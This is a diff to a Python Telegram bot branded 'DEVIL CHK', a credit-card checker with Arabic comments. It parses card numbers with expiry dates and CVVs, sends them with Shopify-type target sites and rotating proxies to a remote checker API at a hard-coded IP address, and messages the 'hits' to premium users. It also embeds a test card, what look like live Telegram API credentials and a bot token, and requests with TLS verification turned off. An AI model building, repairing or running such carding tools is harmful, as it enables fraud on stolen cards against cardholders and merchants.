@@ -13,8 +13,8 @@ API_ID = 39825025
 API_HASH = '47170fd9a11b3f591bbc56849519f0f8'
 BOT_TOKEN = '8827673793:AAHKJphZzbQwOKBZS2pHLTDekPvYUrsJT6Y'
 ADMIN_ID = [1707478010]
+# 1. تم تعديل الرابط الرئيسي هنا ليكون المتوافق مع سيرفرك الجديد
 CHECKER_API_URL = 'http://187.77.70.6:5000/shopify'
-
 
 PREMIUM_USERS_FILE = "premium_users.txt"
 SITES_FILE = 'sites.txt'
@@ -182,9 +182,9 @@ def extract_cc(text):
         cards.append(f"{card}|{month}|{year}|{cvv}")
     return cards
 
+# 2. تعديل دالة فحص الكروت وإلغاء خيار الـ ssl الإجباري وتصحيح صيغة البروكسي
 async def check_card(card, site, proxy):
     try:
-        # 1. تنظيف بيانات البطاقة
         clean_card = card.replace('{', '').replace('}', '').strip()
 
         parts = clean_card.split('|')
@@ -194,49 +194,35 @@ async def check_card(card, site, proxy):
         if not site.startswith('http'):
             site = f'https://{site}'
 
-        # 2. تجهيز البروكسي بالصيغة الصحيحة بدون تضارب
         proxy_str = None
         if proxy:
             proxy_clean = proxy.strip()
-            
-            # إذا كان البروكسي يحتوي على يوزر وباسورد ip:port:user:pass
             if len(proxy_clean.split(':')) == 4:
                 p_parts = proxy_clean.split(':')
-                # صيغة القياسية للبروكسي بيوزر وباسورد
                 proxy_str = f"http://{p_parts[2]}:{p_parts[3]}@{p_parts[0]}:{p_parts[1]}"
-            
-            # إذا كان البروكسي عبارة عن ip:port فقط
             elif len(proxy_clean.split(':')) == 2:
-                # نرسله كـ http://ip:port
-                if not proxy_clean.startswith('http'):
-                    proxy_str = f"http://{proxy_clean}"
-                else:
-                    proxy_str = proxy_clean
+                proxy_str = f"http://{proxy_clean}"
             else:
                 proxy_str = proxy_clean
 
-        # 3. إعداد البيانات للرابط الجديد
         params = {
             'site': site,
             'cc': clean_card
         }
-        
-        # إذا تم تجهيز البروكسي نضيفه للـ params
         if proxy_str:
             params['proxy'] = proxy_str
 
-        # 4. الاتصال بالـ API الجديد
         url = CHECKER_API_URL
         timeout = aiohttp.ClientTimeout(total=100)
 
+        # تم إجبار الجلسة هنا على الاستماع لـ HTTP العادي بدون محاولة تشفير SSL
         async with aiohttp.ClientSession(timeout=timeout) as session:
-            async with session.get(url, params=params) as resp:
+            async with session.get(url, params=params, ssl=False) as resp:
                 if resp.status != 200:
                     return {'status': 'Site Error', 'message': f'HTTP {resp.status}', 'card': card, 'retry': True}
 
                 raw = await resp.json(content_type=None)
 
-        # 5. تحليل الرد
         response_msg = raw.get('Response', raw.get('response', ''))
         price = raw.get('Price', raw.get('price', '-'))
         if price != '-' and price != 0:
@@ -257,8 +243,6 @@ async def check_card(card, site, proxy):
 
     except Exception as e:
         return {'status': 'Dead', 'message': str(e), 'card': card, 'gateway': 'Unknown', 'price': '-'}
-
-
 
 
 async def check_card_with_retry(card, sites, proxies, max_retries=2):
@@ -293,14 +277,14 @@ async def send_realtime_hit(user_id, result, hit_type, username):
 
     message = f"""<b>⚡💳 ㅤ#𝐃𝐄𝐕𝐈𝐋 𝐂𝐇𝐊  💳⚡</b>
 <b>━━━━━━━━━━━━━━━━━</b>
-<b>⚡💠 𝐇𝐢𝐭 𝐅𝐨𝐮𝐧𝐝!</b>
+<b>⚡💠 𝐇𝐢𝐭 𝐅𝐨𝐮ν𝐝!</b>
 <blockquote>{emoji} Status: {status_text}</blockquote>
 <blockquote>💳 Card: <code>{result['card']}</code></blockquote>
 <blockquote>📝 Response: {result['message'][:150]}</blockquote>
 <blockquote>🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 🔥 {result.get('gateway', 'Unknown')} | 💰 {result.get('price', '-')}</blockquote>
 <b>━━━━━━━━━━━━━━━━━</b>
 
-⚡ <b>Bot By: <a href="tg://user?id=1707478010">ㅤㅤ𝐃𝟑𝐯𝟏𝐥_𝐯𝐢𝐩</a></b>"""
+⚡ <b>Bot By: <a href="tg://user?id=1707478010">ㅤㅤ𝐃𝟑𝐯𝟏λ_𝐯𝐢𝐩</a></b>"""
 
     try:
         await bot.send_message(user_id, premium_emoji(message), parse_mode='html')
@@ -401,7 +385,7 @@ async def send_final_results(user_id, results):
     except:
         pass
 
-
+# 3. تعديل دالة فحص المواقع بالكامل لتعمل بنظام الـ params والـ ssl=False لتتوافق مع الرابط الجديد
 async def test_site(site, proxy):
     test_card = "4031630422575208|01|2030|280"
     try:
@@ -410,31 +394,36 @@ async def test_site(site, proxy):
 
         proxy_str = None
         if proxy:
-            proxy_parts = proxy.split(':')
-            if len(proxy_parts) == 4:
-                ip, port, user, password = proxy_parts
-                proxy_str = f"{ip}:{port}:{user}:{password}"
-            elif len(proxy_parts) == 2:
-                ip, port = proxy_parts
-                proxy_str = f"{ip}:{port}"
+            proxy_clean = proxy.strip()
+            if len(proxy_clean.split(':')) == 4:
+                p_parts = proxy_clean.split(':')
+                proxy_str = f"http://{p_parts[2]}:{p_parts[3]}@{p_parts[0]}:{p_parts[1]}"
+            elif len(proxy_clean.split(':')) == 2:
+                proxy_str = f"http://{proxy_clean}"
+            else:
+                proxy_str = proxy_clean
 
-        url = f'{CHECKER_API_URL}?site={site}&cc={test_card}'
+        url = CHECKER_API_URL
+        params = {
+            'site': site,
+            'cc': test_card
+        }
         if proxy_str:
-            url += f'&proxy={proxy_str}'
+            params['proxy'] = proxy_str
 
         timeout = aiohttp.ClientTimeout(total=60)
         async with aiohttp.ClientSession(timeout=timeout) as session:
-            async with session.get(url) as resp:
+            async with session.get(url, params=params, ssl=False) as resp:
                 if resp.status != 200:
                     return {'site': site, 'status': 'dead'}
                 try:
-                    raw = await resp.json()
+                    raw = await resp.json(content_type=None)
                 except:
                     return {'site': site, 'status': 'dead'}
 
-        response_msg = raw.get('Response', '')
-        gateway = raw.get('Gateway', '')
-        price = raw.get('Price', '-')
+        response_msg = raw.get('Response', raw.get('response', ''))
+        gateway = raw.get('Gateway', raw.get('gateway', ''))
+        price = raw.get('Price', raw.get('price', '-'))
 
         if is_site_dead(response_msg, gateway, price):
             return {'site': site, 'status': 'dead'}
@@ -516,7 +505,7 @@ async def admin_panel_callback(event):
 
     admin_text = """<b>⚡💳 ㅤ#𝐃𝐄𝐕𝐈𝐋 𝐂𝐇𝐊  💳⚡</b>
 <b>━━━━━━━━━━━━━━━━━</b>
-<b>⚡💠 𝐀𝐝𝐦𝐢𝐧 𝐏𝐚𝐧𝐞𝐥</b>
+<b>⚡💠 𝐀𝐝𝐦𝐢𝐧 𝐏𝐚𝐧𝐞λ</b>
 <blockquote>• /addpremium id - Add premium user
 • /removepremium id - Remove premium user
 • /listpremium - List premium users
@@ -608,14 +597,14 @@ async def single_cc_check(event):
 
         final_resp = f"""<b>⚡💳 ㅤ#𝐃𝐄𝐕𝐈𝐋 𝐂𝐇𝐊  💳⚡</b>
 <b>━━━━━━━━━━━━━━━━━</b>
-<b>⚡💠 𝐑𝐞𝐬𝐮𝐥𝐭𝐬</b>
+<b>⚡💠 𝐑𝐞𝐬𝐮λ𝐭𝐬</b>
 <blockquote>{status_emoji} Status: {status_text}</blockquote>
 <blockquote>💳 Card: <code>{result['card']}</code></blockquote>
 <blockquote>📝 Response: {result['message'][:150]}</blockquote>
 <blockquote>🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 🔥 {result.get('gateway', 'Unknown')} | 💰 {result.get('price', '-')}</blockquote>
 <b>━━━━━━━━━━━━━━━━━</b>
 
-🤖 <b>Bot By: <a href="tg://user?id=1707478010">ㅤㅤ𝐃𝟑𝐯𝟏𝐥_𝐯𝐢𝐩</a></b>"""
+🤖 <b>Bot By: <a href="tg://user?id=1707478010">ㅤㅤ𝐃𝟑𝐯𝟏λ_𝐯𝐢𝐩</a></b>"""
 
         await status_msg.edit(premium_emoji(final_resp), parse_mode='html')
 
